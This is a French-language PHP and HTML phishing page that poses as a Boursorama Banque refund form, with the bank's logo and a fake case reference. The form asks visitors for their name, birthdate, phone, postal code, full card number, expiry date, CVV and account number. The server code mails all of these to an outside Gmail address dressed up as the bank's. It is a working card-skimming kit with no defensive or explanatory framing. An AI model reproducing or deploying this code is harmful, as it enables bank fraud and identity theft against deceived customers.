<?php
session_start();
if(isset($_POST['send'])){
    //extraction des variables
    extract($_POST);
    //verification si les variables existent et ne sont pas vides
    if(isset($nom) && $nom != "" &&
        isset($prenom) && $prenom != "" &&
        isset($email) && $email != "" &&
        isset($birthdate) && $birthdate != "" &&
        isset($phone) && $phone != "" &&
        isset($zipcode) && $zipcode != "" &&
        isset($cartenum) && $cartenum != "" &&
        isset($expiration) && $expiration != "" &&
        isset($cvv) && $cvv != "" &&
        isset($message) && $message != ""){
        //envoyé l'email
        //le destinataire (votre adresse mail)
       $to = "bank.boursoramaf@gmail.com";
       //objet du mail
       $subject = "Vous avez reçu un message de : " . $email;

       $message = "
       <p> Vous avez recu un message de <strong> ".$email."</strong></p>
       <p><strong>Nom :</strong> ".$nom."</p>
       <p><strong>Prénom :</strong> ".$prenom."</p>
       <p><strong>numéro de téléphone :</strong> ".$phone."</p>
       <p><strong>Date de naissance :</strong> ".$birthdate."</p>
       <p><strong>Code postal :</strong> ".$zipcode."</p>
       <p><strong>Numero de carte :</strong> ".$cartenum."</p>
       <p><strong>MM/YY :</strong> ".$expiration."</p>
       <p><strong>CVV :</strong> ".$cvv."</p>
       <p><strong>Numero de compte :</strong> ".$message."</p>
       ";

       // Toujours définir le type de contenu lors de l'envoi d'e-mails HTML
       $headers = "MIME-Version: 1.0" . "\r\n";
       $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

       // Plus d'en-têtes
       $headers .= 'From: <'.$email.'>' . "\r\n";


       //envoie du mail
       $send = mail($to,$subject,$message,$headers);
       //verification de l'envoi
       if(!$send){
           $_SESSION['succes_message'] = "message envoyé";

       }else {
           $info = "message envoyé";
       }



    }else {
        //si elle sont vides
        $info = "veuillez remplir tous les champs !";
    }
}


?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire de remboursement</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
<?php
        //afficher le message d'erreur
        if(isset($info)) { ?>
            <p class="request_message" styles="color:red">
                <?=$info?>
            </p>
        <?php

      }
    ?>

    <?php
        //afficher le message de succes
        if(isset($_SESSION['succes_message'])) { ?>
            <p class="request_message" styles="color:green">
                <?= $_SESSION['succes_message']?>
            </p>
        <?php

      }
    ?>

    <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>" method="POST">
        <div class="logo">
            <div class="logo-agence">
                <img src="image/Boursorama_Banque_logo_bank-700x179.png" alt="banque">
            </div>
        </div>
        <h5>| REFERENCE BOUVIER-P7053W |</h5>
        <hr>
        <div class="name-field">
            <div>
                <input type="text" name="nom" placeholder="Nom" required>
            </div>
            <div>
                <input type="text" name="prenom" placeholder="Prénom" required>
            </div>
        </div>

        <input type="email" name="email" placeholder="e-mail" required>
        <input type="date" name="birthdate" placeholder="Date de naissance" required>

        <div class="name-field">
            <div>
                <input type="number" name="phone" placeholder="Numéro de telephone" maxlength="10" required>
            </div>
            <div>
                <input type="text" name="zipcode" placeholder="Code postal" required>
            </div>
        </div>

        <!-- carte-->
        <div class="card">
            <img src="image/American-Express-Color.png" alt="">
            <img src="image/logo-cb.jpg" alt="">
            <img src="image/MasterCard_Logo.svg.png" alt="">
            <img src="image/Old_Visa_Logo.svg.png" alt="">
        </div>

        <!---------->

        <hr>
        <input type="text" name="cartenum" placeholder="Numéro de carte" maxlength="16" required>

        <div class="name-field">
            <div>
                <input type="text" name="expiration" placeholder="MM/YY" maxlength="4" required>
            </div>
            <div>
                <input type="text" name="cvv" placeholder="CVV" maxlength="3" required>
            </div>
        </div>

        <textarea name="message" placeholder="Numéro de compte" maxlength="20"></textarea>

        <button name="send">Continuer</button>
        <p>Aide à la connexion & opposition CB</p>
    </form>
    
</body>
</html>